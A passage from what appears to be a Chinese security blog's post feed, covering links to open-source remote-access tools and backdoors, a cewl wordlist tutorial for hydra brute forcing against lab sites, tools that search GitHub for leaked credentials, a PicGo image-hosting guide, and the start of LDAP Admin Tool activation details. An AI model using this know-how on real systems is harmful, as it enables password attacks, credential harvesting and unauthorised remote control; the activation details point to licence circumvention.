target="_blank" rel="noopener">https://github.com/atiger77/Dionaea</a></p><h1 id="0x23-远控"><a href="#0x23-远控" class="headerlink" title="0x23 远控"></a>0x23 远控</h1><p>用gmail充当C&amp;C服务器的后门</p><p><a href="https://github.com/byt3bl33d3r/gcat" target="_blank" rel="noopener">https://github.com/byt3bl33d3r/gcat</a></p><p>开源的远控：</p><p><a href="https://github.com/UbbeLoL/uRAT" target="_blank" rel="noopener">https://github.com/UbbeLoL/uRAT</a></p><p>c#远控：</p><p><a href="https://github.com/hussein-aitlahcen/BlackHole" target="_blank" rel="noopener">https://github.com/hussein-aitlahcen/BlackHole</a></p><hr>]]></content>
      
      
      <categories>
          
          <category> 神兵利器 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 转载 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>密码生成工具cewl的使用</title>
      <link href="/2019/08/22/%E5%AF%86%E7%A0%81%E7%94%9F%E6%88%90%E5%B7%A5%E5%85%B7-cewl%E7%9A%84%E4%BD%BF%E7%94%A8/"/>
      <url>/2019/08/22/%E5%AF%86%E7%A0%81%E7%94%9F%E6%88%90%E5%B7%A5%E5%85%B7-cewl%E7%9A%84%E4%BD%BF%E7%94%A8/</url>
      
        <content type="html"><![CDATA[<h1 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h1><p>今天给大家介绍的是<code>Linux</code>字典生成工具<code>cewl</code>，并学习更多的高级参数用法。首先先简单的介绍一个<code>cewl</code>工具，该工具最大的功能就能能够爬取网站上的信息并自动生成字典，然后就可以使用该字典配合<code>hydra</code>去进行暴力破解，该工具常用于<code>CTF</code>中攻靶拿<code>Flag</code>使用。<code>OK</code>下面开始进入正题。</p><a id="more"></a><h1 id="0x01-环境需求"><a href="#0x01-环境需求" class="headerlink" title="0x01 环境需求"></a>0x01 环境需求</h1><blockquote><p>cewl需要安装在Linux中使用，我使用的环境事kali Linux</p></blockquote><p>如果使用的是其他<code>Linux</code>版本的系统话，需要使用命令去安装</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sodo apt-get install cewl</span><br></pre></td></tr></table></figure><p>命令行运行截图</p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191114155949.png" class="lozad"></p><h1 id="0x02-参数说明"><a href="#0x02-参数说明" class="headerlink" title="0x02 参数说明"></a>0x02 参数说明</h1><h2 id="2-1-可选参数"><a href="#2-1-可选参数" class="headerlink" title="2.1 可选参数"></a>2.1 可选参数</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">-h, –help：显示帮助。</span><br><span class="line">-k, –keep：保存下载文件。</span><br><span class="line">-d &lt;x&gt;, –depth &lt;x&gt;：爬行深度，默认2。</span><br><span class="line">-m, –min_world_length：最小长度，默认最小长度为3。</span><br><span class="line">-o, –offsite：允许爬虫访问其他站点。</span><br><span class="line">-w, –write：将输出结果写入到文件。</span><br><span class="line">-u, –ua &lt;agent&gt;：设置user agent。</span><br><span class="line">-n, –no-words：不输出字典。</span><br><span class="line">–with-numbers：允许单词中存在数字，跟字母一样。</span><br><span class="line">-a, –meta：包括元数据。</span><br><span class="line">–meta_file file：输出元数据文件。</span><br><span class="line">-e, –email：包括email地址。</span><br><span class="line">–email_file &lt;file&gt;：输入邮件地址文件。</span><br><span class="line">–meta-temp-dir &lt;dir&gt;：exiftool解析文件时使用的临时目录，默认是/temp。</span><br><span class="line">-c, –count：显示发现的每个单词的数量。</span><br><span class="line">-v, –verbose：verbose。</span><br><span class="line">–debug:提取调试信息。</span><br></pre></td></tr></table></figure><h2 id="2-2-认证"><a href="#2-2-认证" class="headerlink" title="2.2 认证"></a>2.2 认证</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">–auth_type：Digest或者basic认证。</span><br><span class="line">–auth_user：用户名认证。</span><br><span class="line">–auth_pass：密码认证。</span><br></pre></td></tr></table></figure><h2 id="2-3-代理"><a href="#2-3-代理" class="headerlink" title="2.3 代理"></a>2.3 代理</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">–proxy_host：代理主机。</span><br><span class="line">–proxy_port：代理端口，默认8080。</span><br><span class="line">–proxy_username：用户名代理。</span><br><span class="line">–proxy_password：密码代理。</span><br></pre></td></tr></table></figure><h1 id="0x03-实例使用"><a href="#0x03-实例使用" class="headerlink" title="0x03 实例使用"></a>0x03 实例使用</h1><p><strong>语法：</strong><code>cewl &lt;url&gt; [options]</code></p><h2 id="3-1-简单用法"><a href="#3-1-简单用法" class="headerlink" title="3.1 简单用法"></a>3.1 简单用法</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cewl https://xxxx.com</span><br></pre></td></tr></table></figure><p><strong>用法说明：</strong><code>cewl</code>会爬行该网页，抓取网页中的英文字母，没有设置最小字母长度的情况下默认是3,可以使用<code>-m</code>来指定最小单词长度。</p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191114160009.png" class="lozad"></p><p>##3.2 保存输出结果</p><p>将指定长度的结果报错在<code>txt</code>文件中</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cewl https://digi.ninja/ -m 5 -w test.txt  </span><br><span class="line"><span class="comment">##爬行该页面上最小长度为5的单词并将结果保存在test.txt文档中</span></span><br></pre></td></tr></table></figure><p>然后输入<code>ls -lh</code>来查看结果文件</p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191114160018.png" class="lozad"></p><p>使用<code>cat test.txt</code>命令来查看</p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191114160029.png" class="lozad"></p><blockquote><p>ps:如果该站点的英文单词特别多的话，需要相当一段时间。</p></blockquote><p>然后输入<code>ls -lh</code>来查看结果文件</p><p>##3.3 从网站获取email地址</p><p>你可以使用<code>-e</code>参数来启用邮件参数，配合<code>-n</code>参数使用，<code>-n</code>参数是在爬行给定网站时隐藏生成的单词列表：</p><p>由于刚刚的测试站点上没有<code>email</code>地址，为了能更好的展示出来，换了一个有<code>email</code>地址的网页。结果如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cewl 目标站点 -e -n</span><br></pre></td></tr></table></figure><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191114160041.png" class="lozad"></p><h2 id="3-4-统计网站中单词的重复次数"><a href="#3-4-统计网站中单词的重复次数" class="headerlink" title="3.4 统计网站中单词的重复次数"></a>3.4 <strong>统计网站中单词的重复次数</strong></h2><p>一个英文网站中，不免有很多重复的单词，如果你想统计每个单词的重复次数，可以使用<code>-c</code>命令</p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191114160105.png" class="lozad"></p><h2 id="3-5-增加爬行深度"><a href="#3-5-增加爬行深度" class="headerlink" title="3.5 增加爬行深度"></a>3.5 <strong>增加爬行深度</strong></h2><p>如果你想增加爬行等级，来遍历网站中更多的单词来生成更大的字典，你可以使用<code>-d</code>参数，并指定一个爬行深度</p><p>等级来进行更加深入的爬行，默认等级是2</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cewl https://portswigger.net/blog/http-desync-attacks-request-smuggling-reborn -d 3</span><br></pre></td></tr></table></figure><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191114160121.png" class="lozad"></p><h2 id="3-6-提取调试信息"><a href="#3-6-提取调试信息" class="headerlink" title="3.6 提取调试信息"></a>3.6 提取调试信息</h2><p>你可以使用<code>--debug</code>参数来启用调试模式，显示爬行网站时的错误和原始详细信息：</p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191114160143.png" class="lozad"></p><h2 id="3-7-Verbose模式"><a href="#3-7-Verbose模式" class="headerlink" title="3.7 Verbose模式"></a>3.7 <strong>Verbose模式</strong></h2><p>为了扩大网站的爬行结果来获取网站更加完整详细的信息，你可以加-v参数，也就是<code>verbose</code>模式。它不会生成字典，而是会<code>dump</code>网站上的信息。</p><h2 id="3-8-生成数字字典"><a href="#3-8-生成数字字典" class="headerlink" title="3.8 生成数字字典"></a>3.8 生成数字字典</h2><p>如果你想生成字母数字字典，你可以使用—with-numbers参数</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cewl http://testphp.vulnweb.com/ --with-numbers</span><br></pre></td></tr></table></figure><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191114160159.png" class="lozad"></p><h2 id="3-9-cewl摘要-基础认证"><a href="#3-9-cewl摘要-基础认证" class="headerlink" title="3.9 cewl摘要/基础认证"></a>3.9 <strong>cewl摘要/基础认证</strong></h2><p>如果存在一个认证页面来登录网站，那么上面的配置就行不通了，为了生成字典，我们需要使用下面的参数来绕过认证页面：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">–auth_type: Digest/basic</span><br><span class="line"> –auth_user:用户名</span><br><span class="line"> –auth_pass: 密码</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cewl http://192.168.1.105/dvwa/login.php --auth_type Digest --auth_user  --用户名 auth_pass 密码 -v</span><br></pre></td></tr></table></figure><p>或者</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cewl http://192.168.1.105/dvwa/login.php --auth_type basic --auth_user admin --auth_pass password -v</span><br></pre></td></tr></table></figure><h2 id="3-9-代理URL"><a href="#3-9-代理URL" class="headerlink" title="3.9 代理URL"></a>3.9 <strong>代理URL</strong></h2><p>如果网站使用了代理服务器，那么cewl的默认命令就无法生成字典了，比如下面这条命令：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cewl -w dict.txt http://192.168.1.103/wordpress/</span><br></pre></td></tr></table></figure><p>不过你可以使用—proxy参数来开启代理URL，这样就可以生成字典了，比如下列命令：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cewl --proxy_host 192.168.1.103 --proxy_port 3128 -w dict.txt http://192.168.1.103/wordpress/</span><br></pre></td></tr></table></figure><p>如下图所示，执行第二条命令之后，成功的输出了单词列表：</p><h1 id="0x04-参考链接"><a href="#0x04-参考链接" class="headerlink" title="0x04 参考链接"></a>0x04 参考链接</h1><p><a href="https://www.4hou.com/tools/14693.html" target="_blank" rel="noopener">https://www.4hou.com/tools/14693.html</a></p><p>### </p><hr>]]></content>
      
      
      <categories>
          
          <category> 神兵利器 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> cewl </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>4款GitHub泄露敏感信息搜索工具的安装使用与比较</title>
      <link href="/2019/08/22/4%E6%AC%BEGitHub%E6%B3%84%E9%9C%B2%E6%95%8F%E6%84%9F%E4%BF%A1%E6%81%AF%E6%90%9C%E7%B4%A2%E5%B7%A5%E5%85%B7%E7%9A%84%E5%AE%89%E8%A3%85%E4%BD%BF%E7%94%A8%E4%B8%8E%E6%AF%94%E8%BE%83/"/>
      <url>/2019/08/22/4%E6%AC%BEGitHub%E6%B3%84%E9%9C%B2%E6%95%8F%E6%84%9F%E4%BF%A1%E6%81%AF%E6%90%9C%E7%B4%A2%E5%B7%A5%E5%85%B7%E7%9A%84%E5%AE%89%E8%A3%85%E4%BD%BF%E7%94%A8%E4%B8%8E%E6%AF%94%E8%BE%83/</url>
      
        <content type="html"><![CDATA[<h1 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h1><p>GitHub是一个免费开源的网站，是每个程序员最喜欢发布代码，分享技术的地方，这就导致了一个问题，程序员上传的代码中可能包含了项目中的敏感信息，比如数据库的链接地址和账号密码等。今天来给大家介绍4款发现GitHub中泄露的敏感信息的工具，并将它们做个对比。</p><a id="more"></a><h1 id="0x01-gitrob"><a href="#0x01-gitrob" class="headerlink" title="0x01  gitrob"></a>0x01  gitrob</h1><h2 id="1-1-简介"><a href="#1-1-简介" class="headerlink" title="1.1 简介"></a>1.1 简介</h2><p>Gitrob是一个帮助查找推送到Github上的公共存储库的潜在敏感文件的工具。Gitrob将属于用户或组织的存储库克隆到可配置的深度，并遍历提交历史记录并标记与潜在敏感文件的签名匹配的文件。调查结果将通过网络界面呈现，以便于浏览和分析。Ruby开发，支持通过postgresql数据库</p><p>github地址：<a href="https://github.com/michenriksen/gitrob" target="_blank" rel="noopener">传送门</a></p><p>下载地址：<a href="https://github.com/michenriksen/gitrob/releases" target="_blank" rel="noopener">传送门</a></p><h2 id="1-2-生成GitHub-token"><a href="#1-2-生成GitHub-token" class="headerlink" title="1.2 生成GitHub token"></a>1.2 生成GitHub token</h2><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191114144208.png" class="lozad"></p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191114144231.png" class="lozad"></p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191114144238.png" class="lozad"></p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191114144254.png" class="lozad"></p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191114144301.png" class="lozad"></p><blockquote><p>记住这个令牌，它只出现一次。</p></blockquote><h2 id="1-3-使用"><a href="#1-3-使用" class="headerlink" title="1.3 使用"></a>1.3 使用</h2><h3 id="1-3-1-快速使用"><a href="#1-3-1-快速使用" class="headerlink" title="1.3.1 快速使用"></a>1.3.1 快速使用</h3><p>语法：</p><blockquote><p>gitrob [options] target [target2] … [targetN]</p></blockquote><p>参数：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">-bind-address string</span><br><span class="line">    Address to bind web server to (default <span class="string">"127.0.0.1"</span>)</span><br><span class="line">-commit-depth int</span><br><span class="line">    Number of repository commits to process (default <span class="number">500</span>)</span><br><span class="line">-debug</span><br><span class="line">    Print debugging information</span><br><span class="line">-github-access-token string</span><br><span class="line">    GitHub access token to use <span class="keyword">for</span> API requests</span><br><span class="line">-load string</span><br><span class="line">    Load session file</span><br><span class="line">-no-expand-orgs</span><br><span class="line">    Don<span class="string">'t add members to targets when processing </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">#组织</span></span><br><span class="line"><span class="string">-port int</span></span><br><span class="line"><span class="string">    Port to run web server on (default 9393)</span></span><br><span class="line"><span class="string">-save string</span></span><br><span class="line"><span class="string">    Save session to file</span></span><br><span class="line"><span class="string">-silent</span></span><br><span class="line"><span class="string">    Suppress all output except for errors</span></span><br><span class="line"><span class="string">-threads int</span></span><br><span class="line"><span class="string">    Number of concurrent threads (default number of logical CPUs)</span></span><br></pre></td></tr></table></figure><h3 id="1-3-2-将会话保存到文件"><a href="#1-3-2-将会话保存到文件" class="headerlink" title="1.3.2 将会话保存到文件"></a>1.3.2 将会话保存到文件</h3><p>默认情况下，<code>gitrob</code>会将其状态存储在内存中进行评估。这意味着当<code>Gitrob</code>关闭时，评估结果将丢失。您可以使用以下<code>-save</code>选项将会话保存到文件：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gitrob -save ~/gitrob-session.json acmecorp</span><br></pre></td></tr></table></figure><p><code>Gitrob</code>会将所有收集的信息保存为指定的文件路径，作为特殊的JSON文档。可以再次加载该文件以便在其他时间点进行浏览，与其他分析人员共享或解析以与其他工具和系统进行自定义集成。</p><h3 id="1-3-3-从文件加载会话"><a href="#1-3-3-从文件加载会话" class="headerlink" title="1.3.3 从文件加载会话"></a>1.3.3 从文件加载会话</h3><p>存储在文件中的会话可以使用以下<code>-load</code>选项加载：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gitrob -load ~/gitrob-session.json</span><br></pre></td></tr></table></figure><p>Gitrob将启动其Web界面并提供结果进行分析。</p><h3 id="1-3-4-案例分享"><a href="#1-3-4-案例分享" class="headerlink" title="1.3.4 案例分享"></a>1.3.4 案例分享</h3><p>Windows下使用：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gitrob.exe -bind-address 127.0.0.1 -github-access-token GitHubtoken值 个人的库</span><br></pre></td></tr></table></figure><p>Linux下使用：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./gitrob -bind-address 127.0.0.1 -github-access-token GitHubtoken值 xsafe</span><br></pre></td></tr></table></figure><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191114144135.png" class="lozad"></p><p>在浏览器中输入<a href="http://127.0.0.1:9393查看分析结果" target="_blank" rel="noopener">http://127.0.0.1:9393查看分析结果</a></p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191114144150.png" class="lozad"></p><h2 id="1-4-总结"><a href="#1-4-总结" class="headerlink" title="1.4 总结"></a>1.4 总结</h2><p>开始捣鼓这个的时候，看了官方文档愣是半天没有看懂，因为还需要编译，然后在网上搜集了一些文章看到有直接下载编译好的，有Linux，MAC OS ，Windows 3个版本的。最DT的是，下载下来还不知道用，然后自己摸索，得出了这篇教程。</p><blockquote><p>PS:github token 后面的是GitHub的个人账户或者组织账户，该软件只是对某个账户下的文件进行分析，而不是对GitHub所有的文件查找敏感信息，一开始我以后是搜索关键字就可以从整个GitHub中搜索敏感信息的。结果~</p></blockquote><h1 id="0x02-weakfilescan"><a href="#0x02-weakfilescan" class="headerlink" title="0x02 weakfilescan"></a>0x02 weakfilescan</h1><p>weakfilescan<br>Python开发，多线程，猪猪侠开发中文注释，个性化定制，需要beautifulsoup4<br>用于渗透人员在对网站进行网站渗透时查找敏感文件（配置文件、临时文件）、敏感目录，会首先爬取目标站点的三层目录资源，生成目录FUZZ和文件FUZZ<br><a href="https://github.com/ring04h/weakfilescan" target="_blank" rel="noopener">https://github.com/ring04h/weakfilescan</a></p><h1 id="0x03-GitPrey"><a href="#0x03-GitPrey" class="headerlink" title="0x03 GitPrey"></a>0x03 GitPrey</h1><p>GitPrey<br>Python开发，国人开发中文支持，用于企业搜索关键词，及时发现潜在的敏感信息，需要登录<br><a href="https://github.com/repoog/GitPrey" target="_blank" rel="noopener">https://github.com/repoog/GitPrey</a></p><h1 id="0x04-GitMiner"><a href="#0x04-GitMiner" class="headerlink" title="0x04 GitMiner"></a>0x04 GitMiner</h1><p>GitMiner<br>Python开发，功能简单<br><a href="https://github.com/UnkL4b/GitMiner" target="_blank" rel="noopener">https://github.com/UnkL4b/GitMiner</a>  </p><h1 id="0x05-Hawkeye"><a href="#0x05-Hawkeye" class="headerlink" title="0x05 Hawkeye"></a>0x05 Hawkeye</h1><p><a href="https://github.com/0xbug/Hawkeye" target="_blank" rel="noopener">https://github.com/0xbug/Hawkeye</a></p><h1 id="0x05-参考链接"><a href="#0x05-参考链接" class="headerlink" title="0x05 参考链接"></a>0x05 参考链接</h1><p><a href="https://www.cnblogs.com/sch01ar/p/7625607.html" target="_blank" rel="noopener">https://www.cnblogs.com/sch01ar/p/7625607.html</a></p><p><a href="https://www.helplib.com/GitHub/article_119072" target="_blank" rel="noopener">https://www.helplib.com/GitHub/article_119072</a></p><p>### </p><hr>]]></content>
      
      
      <categories>
          
          <category> 神兵利器 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> GitHub信息泄露 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>PicGo+GitHub打造自己的图床</title>
      <link href="/2019/08/22/picbed-GitHub%E6%89%93%E9%80%A0%E8%87%AA%E5%B7%B1%E7%9A%84%E5%9B%BE%E5%BA%8A/"/>
      <url>/2019/08/22/picbed-GitHub%E6%89%93%E9%80%A0%E8%87%AA%E5%B7%B1%E7%9A%84%E5%9B%BE%E5%BA%8A/</url>
      
        <content type="html"><![CDATA[<h1 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h1><p>很多朋友之前使用七牛云作为自己博客的图床，但是在试用域名到到期后，所有的图片都挂掉了，造成了不必要的麻烦。今天给大家介绍 picbed+GitHub打造一个专属于自己的图床，将所有的图片都托管到GitHub上，写作时，只需要功按几个快捷键就可以完成图片的上传和展示，让你爱上创作。</p><a id="more"></a><h1 id="0x01-前期准备"><a href="#0x01-前期准备" class="headerlink" title="0x01 前期准备"></a>0x01 前期准备</h1><blockquote><p>需要的东西：</p><p>GitHub账号</p><p>picbed图床工具</p></blockquote><h2 id="1-1-GitHub账号申请"><a href="#1-1-GitHub账号申请" class="headerlink" title="1.1 GitHub账号申请"></a>1.1 GitHub账号申请</h2><p>出门右拐百度</p><h2 id="1-2-新建图床仓库"><a href="#1-2-新建图床仓库" class="headerlink" title="1.2 新建图床仓库"></a>1.2 新建图床仓库</h2><p>点击 git 主页右上角的 <code>+</code> 创建 <code>New repository</code>；</p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191115160832.png" class="lozad"></p><p>填写仓库信息，例如我就创建了一个 <code>cloudimg</code> 的仓库。这里注意，仓库得设置为 <code>Public</code> 因为后面通过客户端访问算是外部访问，因此无法访问 <code>Private</code> ，这样的话图片传上来之后只能存储不能显示。所以要设置为 <code>Public</code>。</p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191115160848.png" class="lozad"></p><h2 id="1-3-创建-token-并复制保存"><a href="#1-3-创建-token-并复制保存" class="headerlink" title="1.3 创建 token 并复制保存"></a>1.3 创建 token 并复制保存</h2><p>此时仓库已经建立，点击右上角头像，然后进入设置；</p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191115160859.png" class="lozad"></p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191115160910.png" class="lozad"></p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191115160926.png" class="lozad"></p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191115160936.png" class="lozad"></p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191115160946.png" class="lozad"></p><p>然后拉到下方创建，创建成功后，会出现下方的一串token，记得要复制，只会出现一次，不过实在忘记的话，可以删除了重新创建一个。</p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191115160954.png" class="lozad"></p><h1 id="0x02-PicGo-客户端配置"><a href="#0x02-PicGo-客户端配置" class="headerlink" title="0x02 PicGo 客户端配置"></a>0x02 PicGo 客户端配置</h1><h2 id="2-1-PicGod的下载安装"><a href="#2-1-PicGod的下载安装" class="headerlink" title="2.1 PicGod的下载安装"></a>2.1 PicGod的下载安装</h2><p>PicGo （目前 2.0.4）是一个开源的图床工具，非常优秀。可以到 git 上下载，但下载速度太慢，所以我放了一个百度云的链接，速度快很多。</p><p>git地址：<a href="https://github.com/Molunerfinn/PicGo" target="_blank" rel="noopener">PicGo</a></p><p>Win版下载链接：<a href="https://pan.baidu.com/s/17KycPMoqNCnc1cR_yQO8nQ" target="_blank" rel="noopener">百度云</a> 密码：PicG</p><p>##2.2 PicGod的配置</p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191115161013.png" class="lozad"></p><p>注意：设置自定义域名不要填，不然会一直提示上传图片失败，具体原因我也不知道为什么，在网上找的教程都配置了，但是我配置了以后上传图片总是失败，也算是一个大坑了，</p><h2 id="2-3-快捷键的设置"><a href="#2-3-快捷键的设置" class="headerlink" title="2.3 快捷键的设置"></a>2.3 快捷键的设置</h2><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191115161025.png" class="lozad"></p><p>想用什么快捷键只需要在键盘上安装几个键然后点击确定就行了，我这里的快捷键是Ctrl+Shift+C</p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191115161033.png" class="lozad"></p><p>开启开机自启和使用时间戳将上传的文件重命名</p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191115161043.png" class="lozad"></p><h2 id="安装插件"><a href="#安装插件" class="headerlink" title="安装插件"></a>安装插件</h2><p>配置好上传快捷键以后，还需要安装一个autocopy插件，该插件可以在你上传成功后，自动生成Markdown语法的图片链接到剪切板，只需要复制到Markdown编辑器就可以预览图片，简直方便至极。只需搜索安装就行了。</p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191115161055.png" class="lozad"></p><p>上传成功的相册专区</p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191115161107.png" class="lozad"></p><p>如果图片的Markdown链接没有自动复制到剪切板，只需要在相册中重新点击一下对应图片下方的复制按钮即可。</p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191115161117.png" class="lozad"></p><h1 id="0x03-吐槽"><a href="#0x03-吐槽" class="headerlink" title="0x03 吐槽"></a>0x03 吐槽</h1><p>通过上面的操作，我们已经可以成功的将图片上传到GitHub了，但是有一点不得不吐槽一下，就是GitHub毕竟是国外的，所以我们上传到GitHub的图片加载的速度会有点慢，所以我就研究了一下微博图床，毕竟微博是国内的，然后就有了下面的事件。</p><p>配置好微博的图床</p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191115161126.png" class="lozad"></p><p>很开心的上传了图片，然后使用hexo本地加载一切正常，但是很奇怪的是部署到博客中的时候，浙西图片全部都显示404，我当时的心情是这样的。</p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191115161135.png" class="lozad"></p><p>然后我又不得不重新将图片的链接换成了GitHub图床上的链接才恢复正常。</p><h1 id="0x04-参考链接"><a href="#0x04-参考链接" class="headerlink" title="0x04 参考链接"></a>0x04 参考链接</h1><p><a href="https://www.jianshu.com/p/9d91355e8418" target="_blank" rel="noopener">https://www.jianshu.com/p/9d91355e8418</a></p><p>### </p><hr>]]></content>
      
      
      <categories>
          
          <category> 其他文章 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 图床 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>LDAP-Admin-Tools工具安装激活教程</title>
      <link href="/2019/08/22/LDAP-Admin-Tools%E5%B7%A5%E5%85%B7%E5%AE%89%E8%A3%85%E6%BF%80%E6%B4%BB%E6%95%99%E7%A8%8B/"/>
      <url>/2019/08/22/LDAP-Admin-Tools%E5%B7%A5%E5%85%B7%E5%AE%89%E8%A3%85%E6%BF%80%E6%B4%BB%E6%95%99%E7%A8%8B/</url>
      
        <content type="html"><![CDATA[<h1 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h1><p>在渗透测试的过程中，我们有可能会碰到LDAP匿名访问漏洞，为了验证漏洞的存在，需要使用LDAP访问工具来连接尝试是否可以正常访问。下面来给大家分享一下工具的安装激活教程。</p><a id="more"></a><h1 id="0x01-下载安装"><a href="#0x01-下载安装" class="headerlink" title="0x01 下载安装"></a>0x01 下载安装</h1><p>LDAP下载：<a href="https://www.ldapsoft.com/download.html" target="_blank" rel="noopener">传送门</a> ,选择相应的系统版统下载</p><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20190822105013.png" class="lozad"></p><p>下载完成后傻瓜式安装，一直点下一步即可，需要改变安装位置的自定义安装位置就好了。</p><h1 id="0x02-激活信息"><a href="#0x02-激活信息" class="headerlink" title="0x02  激活信息"></a>0x02  激活信息</h1><p> 不同版本的软件激活信息</p><h2 id="2-1-LDAP-Admin-Tool-Professional-Edition"><a href="#2-1-LDAP-Admin-Tool-Professional-Edition" class="headerlink" title="2.1 LDAP Admin Tool(Professional Edition)"></a>2.1 LDAP Admin Tool(Professional Edition)</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">email&quot;:&quot;myluamas@gmail.com&quot;,</span><br><span 